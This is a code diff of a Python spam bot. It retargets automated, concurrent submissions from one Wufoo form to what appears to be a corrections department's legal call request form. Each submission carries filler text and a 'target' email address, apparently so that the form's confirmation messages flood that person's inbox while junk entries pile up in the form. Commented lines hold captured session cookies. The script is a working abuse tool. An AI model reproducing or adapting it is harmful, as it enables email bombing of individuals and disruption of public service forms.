@@ -8,36 +8,35 @@ from module import Spam
 
 def get(session: requests.Session):
     headers = {
-        'authority': 'tmp.wufoo.com',
+        'authority': 'odoc.wufoo.com',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
-        'cache-control': 'max-age=0',
-        'referer': 'https://www.google.com/',
+        # 'cookie': 'ep202=dsIIpL0lwuMNvJqjw+KG4xBhNGc=; submission-stritch-220=submitted; submission-kaffessamusic-2=submitted; submission-generalbaptist-1=submitted; _splunk_rum_sid=%7B%22id%22%3A%228b1fdc89008cf6438dcb27650bcc5708%22%2C%22startTime%22%3A1676390008265%7D; ep201=WyjRUIFRcr+AfbHPh/JTjgzSSbw=; endpage=%7B%22Username%22%3A%22odoc%22%2C%22FormHash%22%3A%22zcb3ta91cupq8e%22%7D; submission-odoc-1=submitted; wuentry=q-126-z-1399643',
         'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
         'sec-fetch-dest': 'document',
         'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'cross-site',
+        'sec-fetch-site': 'none',
         'sec-fetch-user': '?1',
         'upgrade-insecure-requests': '1',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
     }
 
-    response = session.get('https://tmp.wufoo.com/forms/z1u0o04g0czpse7/', headers=headers)
+    response = session.get('https://odoc.wufoo.com/forms/legal-call-request-form/', headers=headers)
     return response
 
 
 def post(session: requests.Session, id_stamp, text, target):
     headers = {
-        'authority': 'tmp.wufoo.com',
+        'authority': 'odoc.wufoo.com',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
         'cache-control': 'max-age=0',
-        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryPyYpbOKWsirqCmcp',
-        # 'cookie': 'ep201=L5DimjUZWAiFcUPZKvDVH3QJJZs=; ep202=AcXdIWSQ8dT+9GAIUEvOUSQu7AI=; endpage=%7B%22Username%22%3A%22rosenfeldmedia%22%2C%22FormHash%22%3A%22p1lf6a8x1m49id3%22%7D; submission-rosenfeldmedia-7=submitted; _ga=GA1.2.2015933685.1676385321; _gid=GA1.2.1337314481.1676385321; _gcl_au=1.1.242011716.1676385321; OptanonConsent=isGpcEnabled=0&datestamp=Tue+Feb+14+2023+16%3A35%3A21+GMT%2B0200+(%D0%92%D0%BE%D1%81%D1%82%D0%BE%D1%87%D0%BD%D0%B0%D1%8F+%D0%95%D0%B2%D1%80%D0%BE%D0%BF%D0%B0%2C+%D1%81%D1%82%D0%B0%D0%BD%D0%B4%D0%B0%D1%80%D1%82%D0%BD%D0%BE%D0%B5+%D0%B2%D1%80%D0%B5%D0%BC%D1%8F)&version=202211.2.0&isIABGlobal=false&hosts=&consentId=78b23aaa-cc19-44d4-bbbc-5b7e21192b84&interactionCount=0&landingPath=https%3A%2F%2Fwww.wufoo.com%2F&groups=C0001%3A1%2CC0003%3A1%2CC0004%3A1; _fbp=fb.1.1676385321486.1600960129; _uetsid=cf775ba0ac7411ed92815d6f991dc6b3; _uetvid=cf777bd0ac7411edaa97494ab2e8e1e5; PHPSESSID=hi4p47h36qjmfchea4up9n28qpits651; _splunk_rum_sid=%7B%22id%22%3A%2262b1dfa177b599cda848c30e990533d9%22%2C%22startTime%22%3A1676385544312%7D',
-        'origin': 'https://tmp.wufoo.com',
-        'referer': 'https://tmp.wufoo.com/forms/z1u0o04g0czpse7/',
+        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryWZiwAttMwq68ne3R',
+        # 'cookie': 'ep202=dsIIpL0lwuMNvJqjw+KG4xBhNGc=; submission-stritch-220=submitted; submission-kaffessamusic-2=submitted; endpage=%7B%22Username%22%3A%22generalbaptist%22%2C%22FormHash%22%3A%22z1qio9xn1yy0k8e%22%7D; submission-generalbaptist-1=submitted; _splunk_rum_sid=%7B%22id%22%3A%228b1fdc89008cf6438dcb27650bcc5708%22%2C%22startTime%22%3A1676390008265%7D; ep201=WyjRUIFRcr+AfbHPh/JTjgzSSbw=',
+        'origin': 'https://odoc.wufoo.com',
+        'referer': 'https://odoc.wufoo.com/forms/legal-call-request-form/',
         'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
@@ -49,11 +48,11 @@ def post(session: requests.Session, id_stamp, text, target):
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
     }
 
-    data = '------WebKitFormBoundaryPyYpbOKWsirqCmcp\r\nContent-Disposition: form-data; name="Field18"\r\n\r\n5 - Product manufacturer, service providor, vendor or supplier representative doing business with growers or others\r\n------WebKitFormBoundaryPyYpbOKWsirqCmcp\r\nContent-Disposition: form-data; name="Field1"\r\n\r\ntest\r\n------WebKitFormBoundaryPyYpbOKWsirqCmcp\r\nContent-Disposition: form-data; name="Field2"\r\n\r\ntest\r\n------WebKitFormBoundaryPyYpbOKWsirqCmcp\r\nContent-Disposition: form-data; name="Field3"\r\n\r\ntest\r\n------WebKitFormBoundaryPyYpbOKWsirqCmcp\r\nContent-Disposition: form-data; name="Field11"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryPyYpbOKWsirqCmcp\r\nContent-Disposition: form-data; name="currentPage"\r\n\r\nXS9K1dTXcmIZ6tdtdAy5PoQc6Fdk4JfKQ55IfAnWkA0=\r\n------WebKitFormBoundaryPyYpbOKWsirqCmcp\r\nContent-Disposition: form-data; name="saveForm"\r\n\r\nSubmit\r\n------WebKitFormBoundaryPyYpbOKWsirqCmcp\r\nContent-Disposition: form-data; name="comment"\r\n\r\n\r\n------WebKitFormBoundaryPyYpbOKWsirqCmcp\r\nContent-Disposition: form-data; name="idstamp"\r\n\r\nidstamp_field\r\n------WebKitFormBoundaryPyYpbOKWsirqCmcp\r\nContent-Disposition: form-data; name="encryptedPassword"\r\n\r\n\r\n------WebKitFormBoundaryPyYpbOKWsirqCmcp\r\nContent-Disposition: form-data; name="stats"\r\n\r\n{"errors":0,"startTime":21650,"endTime":31335,"referer":"https://www.google.com/"}\r\n------WebKitFormBoundaryPyYpbOKWsirqCmcp\r\nContent-Disposition: form-data; name="clickOrEnter"\r\n\r\nclick\r\n------WebKitFormBoundaryPyYpbOKWsirqCmcp--\r\n'
-    data = data.replace('idstamp_field', id_stamp).replace('test', text).replace('wezxasqw@gmail.com', target)
+    data = '------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field6-1"\r\n\r\n12\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field6-2"\r\n\r\n12\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field6"\r\n\r\n1999\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field3"\r\n\r\nCoffee Creek Correctional Facility- Male Intake (CCIC)\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field46"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field47"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field48"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field21"\r\n\r\n1212\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field7-1"\r\n\r\n12\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field7-2"\r\n\r\n12\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field7"\r\n\r\n1999\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field8-1"\r\n\r\n12\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field8-2"\r\n\r\n12\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field8"\r\n\r\n1999\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field37"\r\n\r\n1 (within 1 to 2 Business Days)\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field10"\r\n\r\n30 minutes\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field43"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field44"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field50"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field55"\r\n\r\nYes\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field155"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field156"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field157"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field22"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field23"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field26"\r\n\r\n123\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field26-1"\r\n\r\n123\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field26-2"\r\n\r\n1232\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field27"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field28"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="currentPage"\r\n\r\nqy7LpJdICBfRLfZTtwuBe7Su8NllyK63O3ImDxiMV33z8k=\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="saveForm"\r\n\r\nSubmit\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="comment"\r\n\r\n\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="idstamp"\r\n\r\nidstamp_field\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="encryptedPassword"\r\n\r\n\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="stats"\r\n\r\n{"errors":1,"startTime":2763905,"endTime":2806794,"referer":"https://odoc.wufoo.com/forms/legal-call-request-form/"}\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="clickOrEnter"\r\n\r\nclick\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R--\r\n'
+    data = data.replace('idstamp_field', id_stamp).replace('test', text).replace('wezxasqw@gmail.com', target).encode()
 
-    response = session.post('https://tmp.wufoo.com/forms/z1u0o04g0czpse7/', headers=headers,
-                            data=data.encode())
+    response = session.post('https://odoc.wufoo.com/forms/legal-call-request-form/', headers=headers,
+                            data=data)
     return response
 
 
@@ -73,7 +72,7 @@ class ConcreteSpam(Spam):
 
 
 def main():
-    spam = ConcreteSpam('wufoo', 'Thank you', target_pool_name='g11mp2')
+    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), 'Thank you.')
     res = spam.send_post()
     if res:
         spam.run_concurrently(60)
